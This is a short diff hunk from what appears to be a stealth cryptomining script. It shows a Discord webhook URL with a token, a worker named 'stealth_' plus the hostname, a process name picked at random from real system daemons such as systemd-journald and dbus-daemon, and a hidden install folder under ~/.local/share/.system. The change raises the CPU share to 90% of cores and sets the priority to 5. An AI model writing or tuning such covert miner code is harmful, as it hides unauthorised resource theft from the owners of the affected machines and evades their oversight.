@@ -8,8 +8,8 @@ DISCORD_WEBHOOK="https://discord.com/api/webhooks/1361974628339155007/mfoD2oC4vt
 WORKER="stealth_$(hostname)"
 
 TOTAL_CORES=$(nproc)
-CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.85)}")
-PRIORITY=0
+CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.9)}")
+PRIORITY=5
 
 FAKE_NAME=$(shuf -n1 -e "dbus-daemon" "systemd-journald" "udevd" "sys-cleaner" "cronlog")
 INSTALL_DIR="$HOME/.local/share/.system"
